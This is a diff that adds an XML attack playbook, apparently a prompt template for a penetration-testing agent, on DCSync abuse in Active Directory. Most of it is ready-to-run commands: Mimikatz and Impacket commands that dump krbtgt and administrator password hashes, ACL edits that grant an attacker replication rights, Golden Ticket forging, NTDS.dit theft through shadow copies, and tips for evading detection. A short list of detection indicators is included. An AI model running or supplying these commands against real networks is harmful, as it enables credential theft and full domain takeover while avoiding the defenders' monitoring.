@@ -1,0 +1,184 @@
+<vulnerability_guide>
+  <title>DCSYNC ATTACK - DOMAIN REPLICATION ABUSE</title>
+
+  <critical>DCSync abuses the Directory Replication Service (DRS) protocol to replicate password data from Domain Controllers. Accounts with Replicating Directory Changes and Replicating Directory Changes All permissions can request password hashes for ANY domain user, including the krbtgt account (enabling Golden Ticket attacks). This is typically the final step to full domain compromise.</critical>
+
+  <scope>
+    - Accounts with DS-Replication-Get-Changes rights
+    - Accounts with DS-Replication-Get-Changes-All rights
+    - Domain Admins group members (have rights by default)
+    - Enterprise Admins and Domain Controllers
+    - Compromised service accounts with excessive permissions
+    - Accounts with GenericAll/WriteDacl on domain object
+  </scope>
+
+  <methodology>
+    1. **Identify privileged accounts**: Find accounts with replication rights
+    2. **Verify permissions**: Confirm DCSync-capable permissions
+    3. **Execute DCSync**: Request password replication from DC
+    4. **Extract hashes**: Dump krbtgt, Administrator, and target accounts
+    5. **Persist access**: Create Golden Ticket or use extracted credentials
+  </methodology>
+
+  <advanced_techniques>
+    <identify_dcsync_accounts>
+      Find accounts with replication privileges:
+      {% raw %}
+      # PowerView - find accounts with DCSync rights
+      Get-ObjectAcl -DistinguishedName "DC=domain,DC=local" -ResolveGUIDs |
+          ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')}
+
+      # BloodHound query
+      MATCH p=(n)-[r:GetChanges|GetChangesAll|GenericAll|WriteDacl|WriteOwner|Owns]->(d:Domain) RETURN p
+
+      # LDAP query for specific rights
+      # DS-Replication-Get-Changes: 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2
+      # DS-Replication-Get-Changes-All: 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2
+
+      # PowerShell - check specific user
+      (Get-Acl "AD:DC=domain,DC=local").Access |
+          ?{$_.IdentityReference -match "targetuser" -and $_.ObjectType -match "1131f6a"}
+
+      # Impacket - find DCSync-capable users
+      findDelegation.py domain/user:pass -dc-ip DC_IP
+      {% endraw %}
+    </identify_dcsync_accounts>
+
+    <execute_dcsync>
+      Perform DCSync attack:
+      {% raw %}
+      # Mimikatz - DCSync specific user
+      mimikatz # lsadump::dcsync /user:Administrator
+      mimikatz # lsadump::dcsync /user:krbtgt
+      mimikatz # lsadump::dcsync /user:domain\targetuser
+
+      # Mimikatz - DCSync all users
+      mimikatz # lsadump::dcsync /all /csv
+
+      # Impacket - secretsdump DCSync
+      secretsdump.py domain/user:password@dc.domain.local -just-dc
+      secretsdump.py -hashes :NTLM_HASH domain/user@dc.domain.local -just-dc
+
+      # secretsdump - specific users
+      secretsdump.py domain/user:password@dc.domain.local -just-dc-user krbtgt
+      secretsdump.py domain/user:password@dc.domain.local -just-dc-user Administrator
+
+      # secretsdump - NTDS extraction (alternative to DCSync)
+      secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
+      {% endraw %}
+    </execute_dcsync>
+
+    <grant_dcsync_rights>
+      Add DCSync permissions (requires WriteDacl on domain):
+      {% raw %}
+      # PowerView - grant DCSync rights
+      Add-ObjectAcl -TargetDistinguishedName "DC=domain,DC=local" -PrincipalIdentity attacker -Rights DCSync
+
+      # PowerShell - add specific rights
+      $acl = Get-Acl "AD:DC=domain,DC=local"
+      $user = New-Object System.Security.Principal.NTAccount("domain\attacker")
+      $guid1 = [GUID]"1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"  # Get-Changes
+      $guid2 = [GUID]"1131f6ad-9c07-11d1-f79f-00c04fc2dcd2"  # Get-Changes-All
+      $ace1 = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($user, "ExtendedRight", "Allow", $guid1)
+      $ace2 = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($user, "ExtendedRight", "Allow", $guid2)
+      $acl.AddAccessRule($ace1)
+      $acl.AddAccessRule($ace2)
+      Set-Acl "AD:DC=domain,DC=local" $acl
+
+      # Impacket - dacledit
+      dacledit.py -action 'write' -rights 'DCSync' -principal attacker -target-dn 'DC=domain,DC=local' domain/admin:pass
+      {% endraw %}
+    </grant_dcsync_rights>
+
+    <golden_ticket>
+      Create Golden Ticket with krbtgt hash:
+      {% raw %}
+      # Mimikatz - Golden Ticket
+      kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:KRBTGT_HASH /ptt
+
+      # Rubeus - Golden Ticket
+      Rubeus.exe golden /rc4:KRBTGT_HASH /user:fakeadmin /domain:domain.local /sid:S-1-5-21-... /ptt
+
+      # Impacket - ticketer
+      ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-... -domain domain.local Administrator
+      export KRB5CCNAME=Administrator.ccache
+
+      # Golden Ticket with custom groups (S-1-5-21-...-512 = Domain Admins)
+      kerberos::golden /user:attacker /domain:domain.local /sid:S-1-5-21-... /krbtgt:HASH /groups:512,513,518,519,520 /ptt
+      {% endraw %}
+    </golden_ticket>
+
+    <dcsync_detection_evasion>
+      Reduce detection footprint:
+      {% raw %}
+      # Request specific attributes only
+      secretsdump.py domain/user:pass@dc -just-dc-user krbtgt -just-dc-ntlm
+
+      # Use Kerberos authentication (less logging than NTLM)
+      export KRB5CCNAME=ticket.ccache
+      secretsdump.py -k -no-pass domain/user@dc.domain.local
+
+      # Spread requests over time
+      # Request individual users instead of bulk dump
+
+      # Use existing DC machine account (normal replication)
+      secretsdump.py -hashes :DC_MACHINE_HASH domain/DC\$@dc.domain.local
+      {% endraw %}
+    </dcsync_detection_evasion>
+
+    <ntds_extraction_alternative>
+      Extract NTDS.dit directly (alternative to DCSync):
+      {% raw %}
+      # Create VSS snapshot
+      vssadmin create shadow /for=C:
+      copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\temp\
+      copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\
+
+      # ntdsutil method
+      ntdsutil "ac i ntds" "ifm" "create full C:\temp" q q
+
+      # Extract hashes from NTDS.dit
+      secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
+
+      # Impacket - remotely (requires admin on DC)
+      secretsdump.py domain/admin:pass@dc.domain.local -use-vss
+      {% endraw %}
+    </ntds_extraction_alternative>
+  </advanced_techniques>
+
+  <validation>
+    - Verify account has required replication permissions
+    - Successfully dump krbtgt hash via DCSync
+    - Successfully dump Domain Admin hash
+    - Create and use Golden Ticket for domain access
+    - Document number of accounts compromised
+  </validation>
+
+  <false_positives>
+    - Account doesn't have both required rights (Get-Changes AND Get-Changes-All)
+    - Network connectivity issues to DC
+    - Time sync issues affecting Kerberos
+    - Firewall blocking replication ports
+  </false_positives>
+
+  <detection_indicators>
+    - Event ID 4662 with GUID 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2 or 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2
+    - DRS replication from non-DC IP addresses
+    - Event ID 4624 Type 3 to DC from unusual source
+    - Replication requests outside normal DC-to-DC communication
+    - High volume of directory service access events
+  </detection_indicators>
+
+  <pro_tips>
+    - krbtgt hash enables Golden Ticket = unlimited domain access
+    - Machine account hashes can also DCSync if DC is compromised
+    - GenericAll on domain object = can grant yourself DCSync rights
+    - DCSync is stealthier than NTDS.dit extraction (no file access)
+    - krbtgt password changes require rotating TWICE (AD keeps previous hash)
+    - Golden Tickets are valid for 10 years by default
+    - AES keys preferred over RC4 for Golden Tickets (less detection)
+    - Consider extracting cloud sync accounts (Azure AD Connect) for hybrid environments
+  </pro_tips>
+
+  <remember>DCSync with krbtgt hash extraction represents complete domain compromise - the krbtgt hash allows forging tickets for ANY user indefinitely until the krbtgt password is rotated twice.</remember>
+</vulnerability_guide>
